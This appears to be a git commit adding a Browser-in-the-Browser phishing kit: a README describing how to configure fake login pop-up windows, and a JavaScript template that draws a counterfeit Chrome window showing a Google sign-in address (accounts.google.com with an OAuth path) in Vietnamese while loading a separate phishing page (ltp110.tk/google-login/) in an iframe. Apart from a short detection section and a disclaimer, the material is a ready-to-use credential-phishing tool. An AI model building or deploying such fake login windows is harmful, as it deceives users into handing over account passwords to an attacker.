3ab048378c8ab4d68adfb9b145bd900e0ba835f8
admin <chung.bkc13061@students.bkacad.edu.vn>
2022-04-20 21:30:12 +0700

    adding files

---
+++ README.md
@@ -0,0 +1,54 @@
+# BITB
+
+Browser In The Browser (BITB) attack is a sophisticated phishing and hard to detect.
+
+# Usage
+
+Each folder has a `script.js` file which contains parameters you can change:
+
+`loadTITLE` - The title display when loading (e.g. Sign in)
+`TITLE` - The title that shows up for the page (e.g. Sign in to your account now)
+`loadDOMAINNAME` - Domain name when loading (default "")
+`DOMAINNAME` - Domain name you're masquerading. (e.g. gmail.com)
+`loadDOMAINPATH` - Domain path when loading (default "about:blank")
+`DOMAINPATH` - Domain path (e.g. /auth/google/login)
+`PHISHINGLINK` - Phishing link which will be embedded into the iFrame (e.g. https://example.com)
+`loadLOGO` - Path to the icon of the website when loading (default "../loading.gif")
+`LOGO` - Path to the icon of the website you're masquerading (default "../google.svg")
+
+# Demo
+
+![Demo](/demo.gif)
+
+# To do
+
+I want to do:
+
+- maximize mode that will turn into full screen
+- function enable ssl check
+- appearance effect more realistic
+- fix some css, ...
+
+if you can, feel free to contribute, thanks!
+
+# Detecting Color Preference
+
+To get the most out of this you should determine the OS from the user agent and the color preference and display the appropriate template.
+
+To find out if you should use dark or light templates check out: https://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers
+
+# Detecting BITB
+
+## Dragging the Window
+
+One way of detecting BITB is by attempting to drag the window to the edge of the browser. If the window cannot escape the browser then it's not a real window. 
+
+## Browser Extension
+
+@odacavo released a great browser extension that can detect and warn users about embedded iframes. It's available here: https://github.com/odacavo/enhanced-iframe-protection
+
+All credits go to @odacavo.
+
+# Disclaimer
+
+Usage of these templates for attacking targets without prior consent is illegal. It's the end user's responsibility to obey all applicable laws. The developer is not responsible for any misuse of these templates.
---
+++ Windows-Chrome-DarkMode/script.js
@@ -0,0 +1,123 @@
+var minimize = document.getElementById("minimize");
+var square = document.getElementById("square");
+var exit = document.getElementById("exit");
+var titleBar = document.getElementById("title-bar");
+
+const loadTITLE = "Đăng nhập";
+const TITLE = "Đăng nhập - Tài khoản Google - Google Chrome";
+const loadDOMAINNAME = "";
+const DOMAINNAME = "https://accounts.google.com/";
+const loadDOMAINPATH = "about:blank";
+const DOMAINPATH = "/o/oauth2/auth/identifier?redirect_uri=storagerelay&%3Fid%3Dauth74362&response_type=permission%20id_token&scope=email%20profile%20openid&openid.realm&include_granted_scopes=true&&fetch_basic_profile=true&gsiwebsdk=2&flowName=GeneralOAuthFlow";
+const PHISHINGLINK = "https://www.ltp110.tk/google-login/";
+const loadLOGO = "../loading.gif";
+const LOGO = "../google.svg";
+
+
+////////////////// Hover listeners //////////////////
+minimize.addEventListener('mouseover', function handleMouseOver() {
+  minimize.style.backgroundColor = '#272727';
+  minimize.style.cursor = 'context-menu';
+});
+
+minimize.addEventListener('mouseout', function handleMouseOut() {
+  minimize.style.backgroundColor = 'black';
+  minimize.style.cursor = 'default';
+});
+
+square.addEventListener('mouseover', function handleMouseOver() {
+  square.style.backgroundColor = '#272727';
+  square.style.cursor = 'context-menu';
+});
+
+square.addEventListener('mouseout', function handleMouseOut() {
+  square.style.backgroundColor = 'black';
+  square.style.cursor = 'default';
+});
+
+exit.addEventListener('mouseover', function handleMouseOver() {
+  exit.style.backgroundColor = 'red';
+  exit.style.cursor = 'context-menu';
+});
+
+exit.addEventListener('mouseout', function handleMouseOut() {
+  exit.style.backgroundColor = 'black';
+  exit.style.cursor = 'default';
+});
+
+titleBar.addEventListener('mouseover', function handleMouseOver() {
+  titleBar.style.cursor = 'context-menu';
+});
+
+titleBar.addEventListener('mouseout', function handleMouseOver() {
+  titleBar.style.cursor = 'default';
+});
+
+
+//////////////// Make window draggable start ////////////////
+// Make the DIV element draggable:
+var draggable = $('#window');
+var title = $('#title-bar');
+
+title.on('mousedown', function (e) {
+  var dr = $(draggable).addClass("drag");
+  height = dr.outerHeight();
+  width = dr.outerWidth();
+  ypos = dr.offset().top + height - e.pageY,
+    xpos = dr.offset().left + width - e.pageX;
+  $(document.body).on('mousemove', function (e) {
+    var itop = e.pageY + ypos - height;
+    var ileft = e.pageX + xpos - width;
+    if (dr.hasClass("drag")) {
+      dr.offset({ top: itop, left: ileft });
+    }
+  }).on('mouseup', function (e) {
+    dr.removeClass("drag");
+  });
+});
+//////////////// Make window draggable end ////////////////
+
+
+////////////////// Onclick listeners //////////////////
+// X button functionality
+$("#exit").click(function () {
+  $("#window").css("display", "none");
+  document.querySelector("#logo-description").textContent = loadTITLE;
+  document.querySelector("#domain-name").textContent = loadDOMAINNAME;
+  document.querySelector("#domain-path").textContent = loadDOMAINPATH;
+  document.querySelector("#logo").src = loadLOGO;
+  $("#content").css("visibility", "hidden");
+});
+
+// Maximize button functionality
+$("#square").click(enlarge);
+
+function enlarge() {
+  if (square.classList.contains("enlarged")) {
+    $("#window").css("width", "40%");
+    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
+    $("#content").css("width", "100%");
+    $("#square").removeClass("enlarged");
+  }
+  else {
+    $("#window").css("width", "70%");
+    $("#title-bar-width").css('width', '100%').css('width', '+=2px');
+    $("#content").css("width", "100%");
+    $("#square").addClass("enlarged");
+  }
+}
+
+$("#clickme").click(function () {
+  $("#window").css("display", "block");
+  setTimeout(loaded, 1000);
+});
+
+function loaded() {
+  document.querySelector("#logo-description").textContent = TITLE;
+  document.querySelector("#domain-name").textContent = DOMAINNAME;
+  document.querySelector("#domain-path").textContent = DOMAINPATH;
+  document.querySelector("#logo").src = LOGO;
+  $("#content").css("visibility", "visible");
+}
+
+document.querySelector("#content").src = PHISHINGLINK;
